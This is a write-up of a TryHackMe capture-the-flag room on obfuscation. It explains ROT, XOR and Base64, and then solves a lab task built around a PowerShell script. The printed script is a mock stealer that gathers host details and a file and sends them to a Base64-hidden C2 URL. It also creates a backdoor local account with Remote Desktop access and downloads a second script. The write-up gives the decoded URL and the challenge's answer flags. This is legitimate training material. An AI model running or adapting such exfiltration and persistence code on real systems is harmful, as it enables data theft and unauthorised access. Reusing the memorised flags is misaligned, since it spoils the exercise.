# Obfuscation - The Egg Shell File

<img width="900" height="900" alt="5f9c7574e201fe31dad228fc-1763962163689" src="https://github.com/user-attachments/assets/81e4c7dc-dc51-4865-8269-b6a04952aa7e" />


https://tryhackme.com/room/obfuscation-aoc2025-e5r8t2y6u9


## Obfuscation

Obfuscation is the practice of intentionally making data difficult to read or analyze in order to evade detection and slow down investigation. Attackers commonly use it to bypass basic security tools that rely on keyword matching or simple signatures.

Simple obfuscation techniques include substitution ciphers like ROT1 and ROT13. ROT1 shifts each letter forward by one position in the alphabet, while ROT13 shifts letters by thirteen positions. These techniques are easy to spot because spaces remain unchanged and words appear slightly altered but recognizable.

More advanced obfuscation often uses XOR. In XOR obfuscation, each byte of data is combined with a key to produce altered output that often looks like random or unreadable symbols. XOR is not practical to do manually, so tools like CyberChef are commonly used to apply or reverse it.

CyberChef is a versatile tool for both obfuscation and deobfuscation. You can apply techniques such as XOR, Base64 encoding, or compression by chaining operations together. It also provides a Magic operation that automatically attempts common decoding methods to help identify unknown obfuscation.

Common visual clues help identify obfuscation types. ROT ciphers show slightly shifted words with intact spacing. Base64 appears as long alphanumeric strings often ending in equals signs. XOR output usually contains unusual symbols and maintains the same length as the original input.

Attackers frequently use layered obfuscation by combining multiple techniques such as compression, XOR, and Base64 encoding. To deobfuscate layered data, you must reverse the steps in the exact opposite order they were applied.

The key takeaway is that most obfuscation techniques are reversible once identified, and pattern recognition combined with tools like CyberChef makes deobfuscation manageable even when multiple layers are involved.

---
## Walkthrough

Open **SantaStealer.ps1**, located on the VM's Desktop in Visual Studio by double clicking it (takes a moment to open), and navigate to the "**Start here**" section of the script. Follow the instructions in the code's comments and save, then run the script from a PowerShell terminal to get your first flag. To open PowerShell, click Start (or press the Windows key), type "PowerShell", and press Enter. In the PowerShell terminal, run the two commands shown in the script’s comments.

````shell-session
PS C:\Users\Administrator> cd .\Desktop\
PS C:\Users\Administrator\Desktop> .\SantaStealer.ps1
````

There is a second challenge waiting for you. This time, you must obfuscate the malicious actor's API key using **XOR**. Follow the Part 2 instructions in the code's comments and then run the script again to get your last flag!

---

SantaStealer.ps1:

``` 
# Only edit where the TODOs say. Do not remove the validator call at the end.

  

# ==========================

# IGNORE THIS

# ==========================

$ErrorActionPreference = 'SilentlyContinue'

  

# ==========================

# Start here

# Part 1: Deobfuscation

# ==========================

# TODO (Step 1): Deobfuscate the string present in the $C2B64 variable and place the URL in the $C2 variable,

# then run this script to get the flag.

  

$C2B64 = "aHR0cHM6Ly9jMi5ub3J0aHBvbGUudGhtL2V4Zmls"

$C2    = "<C2_URL_HERE>"  

# ==========================

# Part 2: Obfuscation

# ==========================

# TODO (Step 2): Obfuscate the API key using XOR single-byte key 0x37 and convert to hexidecimal,

# then add the hex string to the $ObfAPieEy variable.

# Then run this script again to receive Flag #2 from the validator.

$ApiKey = "CANDY-CANE-API-KEY"

$ObfAPIKEY = Invoke-XorDecode -Hex "<HEX_HERE>" -Key 0x37

# ==========================

# ==========================

function Decode-B64 {

    param([Parameter(Mandatory=$true)][string]$S)

    try { [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($S)) } catch { "" }

}

  

function Invoke-XorDecode {

    [CmdletBinding()]

    param(

        [AllowEmptyString()][string]$Hex,

        [int]$Key

    )

  

    if ([string]::IsNullOrWhiteSpace($Hex)) {

        return ""

    }

  

    $clean = $Hex `

        -replace '(?i)0x','' `

        -replace '[\s,''"":;,_-]+','' `

        -replace '[^0-9A-Fa-f]',''

  

    if ($clean.Length -eq 0) {

        return ""

    }

    if (($clean.Length % 2) -ne 0) {

        return ""

    }

  

    $count = $clean.Length / 2

    $bytes = New-Object byte[] $count

  

    for ($i = 0; $i -lt $count; $i++) {

        $pair = $clean.Substring($i * 2, 2)

        try {

            $b = [Convert]::ToByte($pair, 16)

        } catch {

            $b = 0

        }

        $bytes[$i] = ($b -bxor $Key)

    }

  

    try {

        return [Text.Encoding]::UTF8.GetString($bytes)

    } catch {

        return ""

    }

}

  

# ==========================

# ==========================

function Get-SystemSnapshot {

    [PSCustomObject]@{

        ts   = (Get-Date).ToString("o")

        user = $env:USERNAME

        host = $env:COMPUTERNAME

        os   = (Get-CimInstance Win32_OperatingSystem).Version

        ps   = $PSVersionTable.PSVersion.ToString()

    }

}

  

function Get-PresentsFile {

    $path = Join-Path $env:USERPROFILE "Documents\Santa\Presents.txt"

    if (Test-Path -LiteralPath $path) {

        try { (Get-Content -LiteralPath $path -ErrorAction Stop) -join "`n" }

        catch { "[read error]" }

    } else { "[missing]" }

}

  

function New-ExfilPayload {

    param([psobject]$SystemInfo, [string]$Presents)

    [pscustomobject]@{

        t  = "present-list-exfil"

        ep = "[redacted]"

        sys= $SystemInfo

        pl = $Presents

    } | ConvertTo-Json -Depth 5 -Compress

}

  

$__needC2  = [string]::IsNullOrWhiteSpace($C2)

$__needHex = [string]::IsNullOrWhiteSpace($ObfAPIKEY)

if ($__needC2 -and $__needHex) { Write-Host "[i] incorrect C2 URL and  XOR-obfuscated API hex." }

elseif (-not $__needC2 -and $__needHex) { Write-Host "[i] incorrect XOR-obfuscated API hex." }

  

# ==========================

# ==========================

function C2-Armed([string]$Url){

    try {

        if ([string]::IsNullOrWhiteSpace($Url)) { return $false }

        $u=[Uri]$Url

        ($u.Scheme -eq "https") -and ($u.Host -like "*northpole*")

    } catch { $false }

}

function Exfil([string]$Url,[string]$Payload,[string]$Key){

    try {

        $headers = @{ "X-Api-Key" = $Key; "Content-Type" = "application/json" }

        $null = Invoke-WebRequest -Uri $Url -Method POST -Body $Payload -Headers $headers -TimeoutSec 5

        $true

    } catch { $false }

}

  

# ==========================

# ==========================

  

$User       = "UmV2aWxSYWJiaXQ="                  

$Pass       = "SDBsbHlXMDBkXkNhcnJvdHMh"            

$RabbitUrl  = "aHR0cDovLzEyNy4wLjAuMTo4MDgwL3JhYmJpdC5wczE="  

function Ensure-RevilRabbit {

    $User = Decode-B64 $script:User

    $Pass = Decode-B64 $script:Pass

    $sec  = ConvertTo-SecureString $Pass -AsPlainText -Force

    if (-not (Get-LocalUser -Name $User -ErrorAction SilentlyContinue)) {

        New-LocalUser -Name $User -Password $sec -FullName "Service Account" -PasswordNeverExpires -UserMayNotChangePassword | Out-Null

    }

    try { Add-LocalGroupMember -Group "Remote Desktop Users" -Member $User -ErrorAction Stop } catch {}

}

  

function Stage-Rabbit-ForUser {

    $User = Decode-B64 $script:User

    $Url  = Decode-B64 $script:RabbitUrl

  

    $desk = "C:\Users\$User\Desktop"

    try {

        New-Item -ItemType Directory -Path $desk -Force | Out-Null

        & icacls $desk /grant "$env:COMPUTERNAME\${User}:(OI)(CI)M" /T | Out-Null

    } catch {}

  

    $out = Join-Path $desk 'rabbit.ps1'

    $ok = $false

    for ($i=0; $i -lt 3 -and -not $ok; $i++) {

        try {

            Invoke-WebRequest -Uri $Url -OutFile $out -TimeoutSec 10

            $ok = (Test-Path -LiteralPath $out) -and ((Get-Item -LiteralPath $out).Length -gt 0)

        } catch {

            Start-Sleep -Seconds 2

        }

    }

    if (-not $ok) {

        Set-Content -Path $out -Value '# rabbit placeholder' -Encoding UTF8

    }

}

  

# ==========================

# ==========================

Write-Host "[i] Operator session started"

Write-Host "[*] Recon: collecting host and user context"

$sys   = Get-SystemSnapshot

  

Write-Host "[*] Stealing Santas presents list"

$plist = Get-PresentsFile

  

Write-Host "[*] Preparing payload"

$body  = New-ExfilPayload -SystemInfo $sys -Presents $plist

  

if (C2-Armed $C2) {

    Write-Host "[*] Contacting C2 endpoint"

    $ok = Exfil -Url $C2 -Payload $body -Key $ApiKey

    if ($ok) { Write-Host "[+] Exfiltration reported as completed" } else { Write-Host "[i] Exfiltration attempted (no response)" }

} else {

    Write-Host "[i] C2 not reachable"

}

  

Write-Host "[*] Establishing foothold"

Ensure-RevilRabbit

  

Write-Host "[*] Downloading payload..."

Stage-Rabbit-ForUser

  

# ==========================

# !!! DO NOT MODIFY !!!

# ==========================

$ScriptPath = $MyInvocation.MyCommand.Path

$Validator  = Join-Path $PSScriptRoot "validator.exe"

if (Test-Path $Validator) {

    & $Validator --script "$ScriptPath"

} else {

    Write-Host "[!] validator.exe not found. No flags will be printed."

}

```

If we take the string `aHR0cHM6Ly9jMi5ub3J0aHBvbGUudGhtL2V4Zmls`

and decode it in cyberchef using From Base64, we get the URL `https://c2.northpole.thm/exfil`

which we can then place it in the $C2 variable.

```powershell
PS C:\Users\Administrator> cd .\Desktop\
PS C:\Users\Administrator\Desktop> .\SantaStealer.ps1
[i] incorrect XOR-obfuscated API hex.
[i] Operator session started
[*] Recon: collecting host and user context
[*] Stealing Santas presents list
[*] Preparing payload
[*] Contacting C2 endpoint
[i] Exfiltration attempted (no response)
[*] Establishing foothold
[*] Downloading payload...
THM{C2_De0bfuscation_29838}
PS C:\Users\Administrator\Desktop>
```

Q: What is the first flag you get after deobfuscating the C2 URL and running the script?

A: THM{C2_De0bfuscation_29838}

Now we have to obfuscate the API key `CANDY-CANE-API-KEY` using XOR single-byte key 0x37 and convert to hexidecimal, add the hex string to the $ObfAPieEy variable and run the script again to receive the second flag.

<img width="1532" height="758" alt="SS1day18" src="https://github.com/user-attachments/assets/5f869ac0-c403-4684-b37b-2d552a4ac633" />


We then get the output: 747679736e1a747679721a76677e1a7c726e

and when we run the script again, we retrieve the flag

```powershell
PS C:\Users\Administrator\Desktop> .\SantaStealer.ps1
[i] incorrect XOR-obfuscated API hex.
[i] Operator session started
[*] Recon: collecting host and user context
[*] Stealing Santas presents list
[*] Preparing payload
[*] Contacting C2 endpoint
[i] Exfiltration attempted (no response)
[*] Establishing foothold
[*] Downloading payload...
THM{C2_De0bfuscation_29838}
THM{API_Obfusc4tion_ftw_0283}
PS C:\Users\Administrator\Desktop>
```

Q: What is the second flag you get after obfuscating the API key and running the script again?

A: THM{API_Obfusc4tion_ftw_0283}

